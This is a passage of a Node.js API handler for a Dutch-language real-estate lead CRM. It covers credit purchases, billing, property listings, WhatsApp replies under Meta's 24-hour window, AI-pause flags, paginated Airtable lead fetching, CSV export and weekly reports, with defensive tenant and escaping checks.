              <tr><td style="padding:6px 0;color:#666">Bedrag</td><td style="padding:6px 0"><strong>€ ${offerte.bedragEur}</strong></td></tr>
              <tr><td style="padding:6px 0;color:#666">Credits</td><td style="padding:6px 0">${offerte.credits} (${offerte.basisCredits} + ${offerte.bonusCredits} bonus, ${offerte.bonusPct}%)</td></tr>
              <tr><td style="padding:6px 0;color:#666">Per credit</td><td style="padding:6px 0">€ ${offerte.perCredit}</td></tr>
            </table>
            <p style="margin-top:18px;font-size:13px;color:#666">Na betaling bijboeken met
            <code>credits.addCredits('${escHtmlBasic(projectCode)}', ${offerte.credits}, { type: 'purchase' })</code> —
            dan komt het ook in het grootboek te staan.</p>
          </div>`,
        });
      } catch (err) {
        console.error('[credit-purchase] mail mislukt:', err && err.message);
        return res.status(502).json({ error: 'De aanvraag kon niet verstuurd worden. Probeer het zo meteen opnieuw.' });
      }

      console.log(`[credit-purchase] aanvraag ${projectCode}: EUR ${offerte.bedragEur} -> ${offerte.credits} credits`);
      return res.status(200).json({ ok: true, offerte });
    }

    /* ── Facturatie ──────────────────────────────────────────────────────────
       Eén mode voor de hele pagina: plan, credits, verbruik per onderdeel en
       de laatste boekingen. Bewust in één antwoord, want vier losse verzoeken
       bij het openen van een pagina is precies wat een dashboard traag maakt.

       Alles komt uit de eigen tenant. Er staat geen enkel verzonnen getal in:
       ontbreekt het grootboek, dan zegt het antwoord dat -- en toont de UI
       alleen wat de teller wél weet. */
    if (body.mode === 'billing-overview') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        /* getPlanState is puur en leest VELDEN, geen projectcode -- dus eerst
           de klantrij ophalen, net als mode 'plan-status' hierboven doet. */
        const planFormula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
        const [verbruik, klantRes] = await Promise.all([
          credits.getUsageSummary(projectCode),
          atFetch(`https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${planFormula}&maxRecords=1`,
                  { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }).catch(() => null),
        ]);

        let plan = null;
        let klantNaam = '';
        if (klantRes && klantRes.ok) {
          const d = await klantRes.json().catch(() => ({}));
          const rec = (d.records || [])[0];
          if (rec) {
            plan = getPlanState(rec.fields || {});
            klantNaam = String(rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name'] || '').trim();
          }
        }

        let boekingen = [];
        let totalen = null;
        const grootboekAan = await _ledger.available();
        if (grootboekAan) {
          /* Alleen deze periode: het overzicht gaat over wat je NU betaalt.
             De volledige geschiedenis is een export, geen scherm. */
          const sinds = verbruik && verbruik.periodStart ? verbruik.periodStart : undefined;
          boekingen = await _ledger.list(projectCode, { limit: 50, sinds });
          totalen  = await _ledger.totals(projectCode, { sinds });
        }

        return res.status(200).json({
          verbruik: verbruik || { active: false },
          plan: plan || null,
          klantNaam,
          grootboek: {
            beschikbaar: grootboekAan,
            boekingen,
            totalen,
          },
          /* Wat een credit kost per onderdeel, zodat de klant kan zien waar
             zijn credits heen gaan zonder dat wij het per stuk uitrekenen. */
          tarieven: credits.WEIGHTS,
        });
      } catch (err) {
        console.error('[billing-overview]', err && err.message);
        return res.status(500).json({ error: 'Het facturatieoverzicht kon niet opgehaald worden.' });
      }
    }

    if (body.mode === 'listing-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const panden = await _properties.list(projectCode, {
          inclusiefGearchiveerd: body.includeArchived === true,
        });
        /* beschikbaar meesturen zodat de UI het verschil kan tonen tussen
           "geen panden ingevoerd" en "de tabel bestaat nog niet". Dat zijn twee
           heel verschillende boodschappen voor de klant. */
        return res.status(200).json({ properties: panden, available: await _properties.available() });
      } catch (err) {
        console.error('[listing-list]', err && err.code, err && err.message);
        return res.status(500).json({ error: 'Panden konden niet opgehaald worden.' });
      }
    }

    /* Een pand importeren uit een link. Levert een CONCEPT terug -- de
       makelaar kijkt ernaar en drukt daarna pas op opslaan. Zie de kop van
       importeerUitLink() voor waarom er hier niets wordt weggeschreven. */
    if (body.mode === 'listing-import') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      /* De creditpoort staat VOOR de aanroep: dit haalt een pagina op en zet
         er een model op, en allebei kosten geld. */
      const importCheck = await credits.checkCredits(projectCode, credits.FEATURES.PROPERTY_IMPORT);
      if (!importCheck.allowed) {
        return res.status(402).json({ error: 'credit_limit_reached', message: importCheck.message });
      }
      try {
        const uit = await _properties.importeerUitLink(projectCode, body.url, { userId: 'dashboard' });
        /* Pas afschrijven NA een geslaagde uitlezing. Een cookiemuur is geen
           dienst waarvoor je betaalt. */
        credits.recordUsage(projectCode, credits.FEATURES.PROPERTY_IMPORT, {
          credits: credits.WEIGHTS[credits.FEATURES.PROPERTY_IMPORT],
        }).catch(() => {});
        return res.status(200).json(uit);
      } catch (err) {
        console.error('[listing-import]', err && err.code, err && err.message);
        const uitlegbaar = ['no_url', 'bad_url', 'unreadable'];
        if (uitlegbaar.indexOf(err && err.code) !== -1) {
          return res.status(400).json({ error: err.message, code: err.code });
        }
        return res.status(502).json({ error: 'Die pagina uitlezen lukte niet. Probeer het zo meteen opnieuw.' });
      }
    }

    if (body.mode === 'listing-save') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const pand = await _properties.save(projectCode, body.property || {});
        return res.status(200).json({ property: pand });
      } catch (err) {
        console.error('[listing-save]', err && err.code, err && err.message);
        /* De reden telt hier: "adres ontbreekt" en "de tabel bestaat niet" zijn
           allebei een 4xx voor de gebruiker, maar de eerste lost hij zelf op en
           de tweede nooit. */
        const klantfouten = ['no_address', 'bad_code'];
        const code = err && err.code;
        if (klantfouten.indexOf(code) !== -1) return res.status(400).json({ error: err.message, code });
        if (code === 'no_table') return res.status(503).json({ error: err.message, code });
        return res.status(500).json({ error: 'Het pand kon niet opgeslagen worden.' });
      }
    }

    if (body.mode === 'listing-archive') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const pand = await _properties.archive(projectCode, body.code, body.archived !== false);
        return res.status(200).json({ property: pand });
      } catch (err) {
        console.error('[listing-archive]', err && err.code, err && err.message);
        if (err && err.code === 'not_found') return res.status(404).json({ error: 'Pand niet gevonden.' });
        return res.status(500).json({ error: 'Het pand kon niet gearchiveerd worden.' });
      }
    }

    /* ── Command Center ──────────────────────────────────────────────────────
       One mode rather than a new route: Vercel Hobby allows twelve functions
       and this repo is at twelve. It reuses the tenant resolution, the session
       check and the CSRF guard already performed above, and the analysis
       itself (api/_command.js) is pure arithmetic over rows -- no model call,
       so opening the page costs nothing and consumes no credits.

       The calendar is consulted only to learn whether it is CONNECTED, which
       decides whether "book an appointment" may be recommended at all. Slot
       availability is not checked here: that belongs at the moment of booking,
       through the existing flow, so the page can never show a slot as free
       that the calendar would refuse. */
    if (body.mode === 'command-center') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const { leads: cmdLeads } = await _leadsRead.fetchLeads(projectCode, {
          token: AIRTABLE_TOKEN, baseId: BASE_ID, maxPages: 6,
        });

        // Fail-soft: a client without Google Calendar still gets the whole page,
        // minus the booking recommendation. An outage here must not blank it.
        let calendarConnected = false;
        let appointmentsToday = 0;
        try {
          const access = await gcalAccessForProject(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
          if (access && access.token) {
            calendarConnected = true;
            const dayStart = new Date(); dayStart.setHours(0, 0, 0, 0);
            const dayEnd = new Date(dayStart.getTime() + 24 * 60 * 60 * 1000);
            const todays = await _gcal.listEvents(
              access.token, access.calId, dayStart.toISOString(), dayEnd.toISOString(), 50);
            appointmentsToday = (todays || []).length;
          }
        } catch (gerr) {
          console.warn('[command-center] calendar unavailable:', gerr && gerr.message);
        }

        return res.status(200).json(_command.build(cmdLeads, {
          calendarConnected, appointmentsToday,
        }));
      } catch (err) {
        console.error('[command-center] failed:', err && err.message);
        // Explicit, so the UI can say "we could not read your CRM" rather than
        // rendering an empty command center that looks like a quiet morning.
        return res.status(503).json({ error: 'Je CRM-gegevens zijn nu niet bereikbaar.', code: 'unavailable' });
      }
    }

    if (body.mode === 'property-generate') {
      // The whole guard chain — eight option validations, upload parsing, the
      // isConfigured() fail-soft, the credit block, generation, storage,
      // persistence and usage recording — lives in api/_images.js's
      // generateForClient(). It moved there when Faro's chat became a second
      // caller: two copies of a money path drift, and the copy that drifts is
      // the one that spends the client's money. This route now only does what
      // a route should — resolve the tenant, call it, map errors to status.
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const record = await images.generateForClient(projectCode, body, { credits });
        return res.status(200).json({ ok: true, image: record });
      } catch (err) {
        if (err instanceof images.ImageFeatureError) {
          // The credit ceiling keeps its distinct shape — the dashboard
          // branches on error === 'credit_limit_reached' to show the upgrade
          // copy rather than a generic failure toast.
          if (err.code === 'credit_limit_reached') {
            return res.status(402).json({ error: 'credit_limit_reached', message: err.message });
          }
          return res.status(err.status || 500).json({ error: err.message });
        }
        console.error('[property-generate] error:', err.message);
        return res.status(500).json({ error: 'Serverfout bij AI-beeldgeneratie. Probeer later opnieuw.' });
      }
    }

    // ── C0. AI pause / resume — human takeover for a lead's WhatsApp thread ──
    // POST { mode: 'ai-pause',  leadId: 'recXXX' }
    // POST { mode: 'ai-resume', leadId: 'recXXX' }
    // The flag lives inside the lead's existing Notities JSON envelope
    // (fldoLRI5W12ThTls7) rather than a new Airtable field — same mechanism
    // api/form.js's flagWaFailed / api/whatsapp.js's mergeWaFailedFlag already
    // use for waFailed. api/whatsapp.js's processMessage() reads this flag
    // (getAiPauseInfo) on every inbound message and skips runAI() while it's
    // set — see its own doc comment there for the full contract.
    if (body.mode === 'ai-pause' || body.mode === 'ai-resume') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const leadId = String(body.leadId || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(leadId)) return res.status(400).json({ error: 'Ongeldig record ID' });

      try {
        // Ownership check — identical pattern to every other lead mutation
        // in this file (PATCH above, appointment-create, mode C below).
        const lRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const lead = await lRes.json();
        const leadProject = lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code'] || '';
        if (leadProject !== projectCode) return res.status(403).json({ error: 'Geen toegang tot deze lead' });

        const pausing = body.mode === 'ai-pause';
        const rawNotities = lead.fields?.['fldoLRI5W12ThTls7'] || lead.fields?.['Notities'] || '';
        const mergedNotities = mergeNotitiesPatch(rawNotities, {
          aiPaused: pausing ? { at: new Date().toISOString(), by: clientName || 'dashboard' } : undefined
        });

        const uRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: { fldoLRI5W12ThTls7: mergedNotities } })
          }
        );
        if (!uRes.ok) return res.status(500).json({ error: 'Opslaan mislukt. Probeer later opnieuw.' });

        return res.status(200).json({ ok: true, aiPaused: pausing });
      } catch (err) {
        console.error('[leads ai-pause/resume] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── C. Existing: send a WhatsApp reply on an existing lead (2-way chat) ─
    // POST /api/leads?id=recXXX  body: { message: "text" }
    // Works identically whether the lead is AI-paused or not — pausing only
    // stops api/whatsapp.js's processMessage() from calling the AI; it never
    // gates a human's own reply sent from here.
    try {
      const qs     = (req.url || '').split('?')[1] || '';
      const params = new URLSearchParams(qs);
      const recordId = params.get('id') || '';

      if (!/^rec[A-Za-z0-9]{14}$/.test(recordId)) {
        return res.status(400).json({ error: 'Ongeldig record ID' });
      }

      const message = String(body.message || '').trim().slice(0, 2000);
      if (!message) return res.status(400).json({ error: 'Bericht is leeg' });

      // Fetch the lead. Verify it belongs to the authenticated client (security)
      const lRes = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
      );
      if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
      const lead = await lRes.json();
      const leadProject = lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code'] || '';
      if (!projectCode || leadProject !== projectCode) {
        return res.status(403).json({ error: 'Geen toegang tot deze lead' });
      }
      const phone = lead.fields?.['fld6YaitW0lMqHUrd'] || lead.fields?.['Phone'] || '';
      if (!phone) return res.status(400).json({ error: 'Lead heeft geen telefoonnummer' });

      // Load conversation history up front — needed both for the 24h window
      // check below and to append the reply after sending.
      let history = [];
      const stored = lead.fields?.['Conversation History'];
      if (stored) { try { history = JSON.parse(stored); } catch {} }

      // ── Meta 24h customer-service window ──────────────────────────────────
      // Freeform messages are only allowed within 24h of the lead's last
      // inbound message — the same policy api/cron-followup.js's follow-up
      // loop and this file's appointment-create/sendAppointmentConfirmation
      // already respect (see FOLLOWUP_TEMPLATE_NAME / BOOKING_TEMPLATE_NAME).
      // A manually typed reply can't be squeezed into a fixed, pre-approved
      // template body (templates only take name/date-style variables, never
      // free text), so outside the window we send an approved generic
      // re-engagement template INSTEAD of the typed text when one is
      // configured, and refuse with a clear error otherwise — exactly the
      // "MUST use an approved template or refuse" contract this feature
      // calls for. Never risk the shared WhatsApp number.
      //
      // `ts` on user-role history entries is only stamped going forward (see
      // api/whatsapp.js's processMessage). Conversations that predate this
      // change have no `ts` on their inbound entries — we can't prove those
      // are inside the window, so unknown fails closed (treated as expired)
      // rather than assuming freeform is still safe.
      let lastInboundTs = null;
      for (let i = history.length - 1; i >= 0; i--) {
        const m = history[i];
        if (m && m.role === 'user' && typeof m.ts === 'number') { lastInboundTs = m.ts; break; }
      }
      const hoursSinceInbound = lastInboundTs !== null ? (Date.now() - lastInboundTs) / 3_600_000 : null;
      const withinWindow = hoursSinceInbound !== null && hoursSinceInbound < 24;

      // Per-client sender number (multitenancy prep) — see the test-message
      // mode above for the full comment; same fallback contract here.
      const clientPnid      = await getClientWaPhoneNumberId(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
      const PHONE_NUMBER_ID = clientPnid || process.env.PHONE_NUMBER_ID;
      const WHATSAPP_TOKEN  = process.env.WHATSAPP_TOKEN;
      if (!PHONE_NUMBER_ID || !WHATSAPP_TOKEN) {
        return res.status(500).json({ error: 'WhatsApp configuratie ontbreekt op de server' });
      }

      let viaTemplate = false;
      if (!withinWindow) {
        // MANUAL_REPLY_TEMPLATE_NAME lets an operator configure a dedicated
        // re-engagement template for this flow; falls back to the same
        // FOLLOWUP_TEMPLATE_NAME cron-followup.js already uses so no extra
        // Meta approval is required to get this working.
        const TEMPLATE_NAME = process.env.MANUAL_REPLY_TEMPLATE_NAME || process.env.FOLLOWUP_TEMPLATE_NAME;
        // Resolved against Meta's actually-approved template languages
        // (nl/fr/en today) — see _lang.resolveTemplateLanguage()'s header.
        const TEMPLATE_LANG = _lang.resolveTemplateLanguage(
          process.env.MANUAL_REPLY_TEMPLATE_LANG || process.env.FOLLOWUP_TEMPLATE_LANG || 'nl', 'nl'
        ).code;
        if (!TEMPLATE_NAME) {
          return res.status(409).json({
            error: 'Het 24u WhatsApp-venster is verlopen (of onbekend) sinds het laatste bericht van deze lead. Een vrij bericht versturen kan het gedeelde WhatsApp-nummer laten blokkeren door Meta. Configureer FOLLOWUP_TEMPLATE_NAME (of MANUAL_REPLY_TEMPLATE_NAME) met een goedgekeurde template, of wacht tot de lead opnieuw schrijft.'
          });
        }
        const leadNameForTpl  = lead.fields?.['fldbk0LVNckOU0bqA'] || lead.fields?.['Name'] || '';
        const firstNameForTpl = String(leadNameForTpl).trim().split(' ')[0] || '';
        const tplSent = await sendWATemplate(phone, TEMPLATE_NAME, TEMPLATE_LANG, [firstNameForTpl], PHONE_NUMBER_ID, WHATSAPP_TOKEN);
        if (!tplSent) return res.status(502).json({ error: 'Versturen van goedgekeurde template mislukt.' });
        viaTemplate = true;
      } else {
        // Send WhatsApp via Meta Graph API (inside the 24h window: freeform is safe)
        const waRes = await fetch(`https://graph.facebook.com/v19.0/${PHONE_NUMBER_ID}/messages`, {
          method:  'POST',
          headers: { Authorization: `Bearer ${WHATSAPP_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ messaging_product: 'whatsapp', to: phone, type: 'text', text: { body: message } })
        });
        const waData = await waRes.json().catch(() => ({}));
        if (!waRes.ok || waData.error) {
          console.error('[leads reply] WhatsApp send failed:', JSON.stringify(waData.error || waData));
          return res.status(502).json({ error: 'WhatsApp versturen mislukt', details: waData.error?.message || 'onbekend' });
        }
      }

      // Append to Conversation History so dashboard shows it immediately.
      // Use role 'assistant' with a 'manual:true' marker so we can style it
      // differently. When sent via template instead of the typed text, mark
      // it so the dashboard never claims the lead received words they didn't.
      history.push(viaTemplate
        ? { role: 'assistant', content: message, manual: true, template: true, ts: Date.now() }
        : { role: 'assistant', content: message, manual: true, ts: Date.now() });
      if (history.length > 50) history = history.slice(-50);

      // A human just replied — clear any 'escalated' marker api/whatsapp.js
      // set, so the takeover widget stops flagging a lead that's now handled.
      // Merge-based (never overwrite): preserves notes/tasks/calls/afspraak/
      // waFailed/aiPaused exactly like the ai-pause/ai-resume modes above.
      const rawNotitiesForClear = lead.fields?.['fldoLRI5W12ThTls7'] || lead.fields?.['Notities'] || '';
      const clearedNotities = mergeNotitiesPatch(rawNotitiesForClear, { escalated: undefined });

      const updateRes = await atFetch(
        `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${recordId}`,
        {
          method:  'PATCH',
          headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ fields: { 'Conversation History': JSON.stringify(history), fldoLRI5W12ThTls7: clearedNotities } })
        }
      );
      if (!updateRes.ok) {
        console.warn('[leads reply] history update failed (message was sent)', updateRes.status);
      }
      return res.status(200).json({ ok: true, history, viaTemplate });
    } catch (err) {
      console.error('POST reply error:', err.message);
      return res.status(500).json({ error: 'Serverfout. Probeer opnieuw' });
    }
  }

  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  // ── GET. Fetch all leads (paginated) ───────────────────────────────────────
  // Every other branch in this file guards this; the main GET did not. Reaching
  // here without a projectCode means a session token or an Airtable client
  // record with a blank Project Code — and the filter below would then match
  // every lead whose own Project Code is blank, i.e. one misconfigured account
  // seeing other tenants' orphaned leads. The admin token never lands here (it
  // short-circuits GET with an empty payload above), so this is only ever a
  // misconfiguration, and refusing is the right answer.
  if (!projectCode) return res.status(403).json({ error: 'Geen client context' });

  // Try cache first. On 429 we return stale payload so the dashboard stays alive.
  const leadsCache = getCachedLeads(projectCode);
  const cacheAge   = leadsCache ? Date.now() - leadsCache.ts : Infinity;

  let allLeads = [];
  let usedStale = false;
  const MAX_PAGES = 20;          // 20 x 100 = 2.000 leads, zie de lus hieronder
  let pagesFetched = 0;
  let listTruncated = false;
  try {
    // Use field ID (fldSmczuyUJd26HLe = Project Code). field IDs are stable,
    // field names can be renamed in Airtable without breaking the query.
    const formula = encodeURIComponent(`{fldSmczuyUJd26HLe}="${escapeFormula(projectCode)}"`);
    let offset    = '';
    do {
      // Do NOT use returnFieldsByFieldId=true here. Airtable returns field names
      // as response keys by default, and two fields (Conversation History, Last
      // Message) have no known field IDs.  Filter formula and sort still use field
      // IDs. Those work regardless of this parameter.
      const url  = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&sort[0][field]=fldR0r13EU4RwrtvH&sort[0][direction]=desc&pageSize=100${offset ? '&offset=' + offset : ''}`;
      // Single-shot fetch. NO retries.  Retrying on 429 causes overlapping
      // bursts from multiple sessions that keep Airtable permanently limited.
      // On 429 we fall through to the stale cache immediately.
      const lRes = await fetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
      if (lRes.status === 429) {
        const retryAfter = lRes.headers.get('retry-after') || '?';
        const body429    = await lRes.text().catch(() => '');
        // Airtable now returns {"errors":[{"error":"RATE_LIMIT_REACHED",...}]}
        let errType = '?';
        try { const p = JSON.parse(body429); errType = p?.errors?.[0]?.error || p?.error?.type || p?.type || '?'; } catch {}
        console.warn('[leads] 429 retryAfter=' + retryAfter + ' type=' + errType);
        if (leadsCache && cacheAge < MAX_STALE_MS) {
          console.warn('[leads] 429. serving stale cache (age ' + Math.round(cacheAge / 1000) + 's)');
          usedStale = true;
          break;
        }
        console.warn('[leads] 429. no usable cache, returning empty payload');
        return res.status(200).json({
          leads: [], stats: { total:0, qualified:0, booked:0, conversionRate:0, thisMonth:0, avgResponseTime:0, avgLeadScore:0 },
          client: { naam: clientName, calendly: calendlyLink }, rateLimited: true
        });
      }
      const lData = await lRes.json();
      if (!lRes.ok) {
        console.error(`[leads] Airtable ${lRes.status}:`, JSON.stringify(lData).slice(0, 300));
        throw new Error('Airtable ' + lRes.status);
      }
      allLeads = allLeads.concat(lData.records || []);
      offset   = lData.offset || '';
      // Deze lus had geen bovengrens, terwijl de export-paden in dit bestand er
      // wel een hebben (20 pagina's). Hij draait bij ELKE dashboardlading en bij
      // elke poll van elk open tabblad, sequentieel, 100 records per keer. Rond
      // de 5.000 leads is dat al 50 opeenvolgende Airtable-calls; ruim daarboven
      // haalt de functie zijn maxDuration van 60s niet en is het dashboard voor
      // die klant permanent stuk. Liever de 2.000 nieuwste leads tonen dan een
      // time-out. Wie alles wil, gebruikt de CSV-export.
      if (offset && ++pagesFetched >= MAX_PAGES) {
        console.warn(`[leads] ${projectCode}: meer dan ${MAX_PAGES * 100} leads, lijst afgekapt`);
        listTruncated = true;
        break;
      }
    } while (offset);
  } catch (err) {
    console.error('Leads fetch error:', err.message);
    if (leadsCache && cacheAge < MAX_STALE_MS) {
      console.warn('Leads error. Serving stale cache as fallback (age ' + Math.round(cacheAge / 1000) + 's)');
      return res.status(200).json({ ...leadsCache.payload, stale: true });
    }
    // Geen bruikbare cache. Dit gaf een keurige 200 met een lege leadlijst
    // terug, en dat is het gevaarlijkste antwoord dat hier mogelijk is: het is
    // niet te onderscheiden van een gloednieuw account. Een klant met 400 leads
    // kreeg tijdens een Airtable-storing het onboardingscherm te zien — "0 van 5
    // klaar · Ontvang je eerste lead" — met nergens de mededeling dat er iets
    // mislukt was. De command-center-route in dit bestand doet het al goed met
    // een 503; dit pad stond andersom.
    //
    // 503 en niet 500: dit is tijdelijk en de dashboardpoll mag het gewoon
    // opnieuw proberen. `unavailable` is wat de UI leest om "we konden je CRM
    // niet lezen" te tonen in plaats van een leeg huis.
    console.warn('Leads error, no usable cache. Returning 503 rather than a fake empty account');
    return res.status(503).json({
      error: 'We konden je leads nu niet ophalen.',
      code: 'crm_unavailable',
      unavailable: true,
      detail: err.message,
      client: { naam: clientName, calendly: calendlyLink }
    });
  }

  // Serve stale cache when 429 was hit mid-pagination
  if (usedStale) {
    return res.status(200).json({ ...leadsCache.payload, stale: true });
  }

  // The record mapper and the stat arithmetic moved to api/_leads-read.js so
  // Faro reads a lead the same way this file does. Nothing about the output
  // changed — the dashboard reads these exact keys — but there is now one
  // table of Airtable field IDs instead of two that can drift apart.
  const leads = allLeads.map(_leadsRead.mapLead);
  const stats = _leadsRead.computeStats(leads);
  const now = new Date();

  // ── Query params ────────────────────────────────────────────────────────────
  const qs     = (req.url || '').split('?')[1] || '';
  const params = new URLSearchParams(qs);

  // CSV export
  if (params.get('export') === 'true') {
    const esc  = v => '"' + csvFormulaGuard(String(v || '')).replace(/"/g, '""') + '"';
    const hdrs = ['Naam','Telefoon','Status','Gekwalificeerd','Bron','Score','Urgentie','Capaciteit','Fit','Verwachte Waarde','Datum','Samenvatting'];
    const rows = leads.map(l => [
      l.naam, l.telefoon, l.status, l.qualified ? 'Ja' : 'Nee',
      l.bron, l.leadScore, l.urgentie, l.capaciteit, l.fit,
      l.verwachteWaarde,
      l.datum ? new Date(l.datum).toLocaleDateString('nl-BE') : '',
      l.samenvatting
    ].map(esc).join(';'));
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=helvaro-leads.csv');
    return res.status(200).send([hdrs.join(';'), ...rows].join('\n'));
  }

  // Weekly rapport
  if (params.get('rapport') === 'week') {
    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
    const wLeads  = leads.filter(l => l.datum && new Date(l.datum) >= sevenDaysAgo);
    const wTotal  = wLeads.length;
    const wQual   = wLeads.filter(l => l.qualified).length;
    const wBooked = wLeads.filter(l => l.afspraakGeboekt).length;
    const wConv   = wTotal > 0 ? Math.round((wBooked / wTotal) * 1000) / 10 : 0;
    const mn  = ['jan','feb','mrt','apr','mei','jun','jul','aug','sep','okt','nov','dec'];
    const van = `${sevenDaysAgo.getDate()} ${mn[sevenDaysAgo.getMonth()]}`;
    const tot = `${now.getDate()} ${mn[now.getMonth()]} ${now.getFullYear()}`;
    // Warm the 429-fallback cache so the regular dashboard view benefits
    // even when the most recent request to leads.js was a rapport request.
    setCachedLeads(projectCode, { leads, stats, client: { naam: clientName, calendly: calendlyLink } });
    return res.status(200).json({
      rapport: {
        periode:              `${van} - ${tot}`,
        totaalLeads:          wTotal,
        gekwalificeerd:       wQual,
        afspraken:            wBooked,
        conversie:            wConv,
        gekwalificeerdeLijst: wLeads.filter(l => l.qualified)
          .map(l => ({ naam: l.naam, telefoon: l.telefoon, samenvatting: l.samenvatting, leadScore: l.leadScore }))
      },
      leads, stats, client: { naam: clientName, calendly: calendlyLink }
    });
  }

  const responsePayload = { leads, stats, client: { naam: clientName, calendly: calendlyLink } };
  // Alleen aanwezig als de paginering tegen zijn plafond liep, zodat het
  // dashboard kan zeggen "de 2.000 nieuwste" in plaats van te suggereren dat
  // dit alles is.
  if (listTruncated) responsePayload.truncated = MAX_PAGES * 100;
  setCachedLeads(projectCode, responsePayload); // warm cache for 429 fallback

  // Cache the response at the browser level so all open tabs share one response
  // for 2 minutes instead of each hitting Airtable independently.
  // Vary: x-api-key ensures different users never share each other's cached data.
  res.setHeader('Cache-Control', 'private, max-age=120');
  res.setHeader('Vary', 'x-api-key');
  return res.status(200).json(responsePayload);
};

// Escape double-quotes and backslashes for Airtable formula strings
/* Voor de e-mail hieronder. De klantnaam komt uit Airtable en is dus niet door
   ons geschreven -- die hoort niet als HTML in een mailtje terecht te komen. */
function escHtmlBasic(v) {
  return String(v == null ? '' : v)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function escapeFormula(val) {
  return String(val || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"');
}

// ── Per-client WhatsApp sender number (multitenancy prep) ──────────────────
// Resolves which Phone Number ID to send FROM for a given client. Blank on
// every client today (single shared WhatsApp Business number) — returns ''
// in that case, and every call site here falls back to the shared
// PHONE_NUMBER_ID env var exactly like before. This indirection is what lets
// a future per-client Meta Tech Provider / Embedded Signup number become a
// config change instead of a rewrite later (Tech Provider enrolment itself
// is explicitly out of scope for now — see the multitenancy-prep brief).
// fldbrhlSrsmlJwcYr = WhatsApp Phone Number ID field on Client Config
// (tblPidTrwGRzRt4LZ). Mirrors api/whatsapp.js's F_WA_PHONE_NUMBER_ID.
const F_WA_PHONE_NUMBER_ID = 'fldbrhlSrsmlJwcYr';
const _waPnidCache = new Map();
const WA_PNID_TTL  = 5 * 60 * 1000;
async function getClientWaPhoneNumberId(projectCode, airtableToken, baseId, clientsTable) {
  if (!projectCode) return '';
  const cached = _waPnidCache.get(projectCode);
  if (cached && Date.now() - cached.ts < WA_PNID_TTL) return cached.value;
  try {
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const r = await atFetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (!r.ok) return '';
    const rec   = ((await r.json()).records || [])[0];
    const value = (rec && rec.fields && (rec.fields[F_WA_PHONE_NUMBER_ID] || rec.fields['WhatsApp Phone Number ID'])) || '';
    _waPnidCache.set(projectCode, { value, ts: Date.now() });
    return value;
  } catch (e) {
    console.error('[WhatsApp] client phone-number-id lookup mislukt (valt terug op gedeeld nummer):', e && e.message);
    return '';
  }
}

// ── Google Calendar access for a project (optional, fail-soft) ────────────────
// Looks up the client's Klanten record, decrypts their stored refresh token, and
// returns a live access token. Returns { token: '' } if not connected/configured
// — every caller treats an empty token as "no Google", never as an error.
// Field IDs: fldkYmK3jAabvytCF = Google Refresh Token, fldWBxxhGYEZNIMqA =
// Google Calendar ID (both verified against the live Airtable base; name
// fallback kept for defense-in-depth, matching this file's existing convention).
async function gcalAccessForProject(projectCode, airtableToken, baseId, clientsTable) {
  try {
    if (!_gcal.isConfigured() || !projectCode) return { token: '', calId: 'primary' };
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const r = await atFetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (!r.ok) return { token: '', calId: 'primary' };
    const rec = ((await r.json()).records || [])[0];
    const enc = rec && rec.fields && (rec.fields['fldkYmK3jAabvytCF'] || rec.fields['Google Refresh Token']);
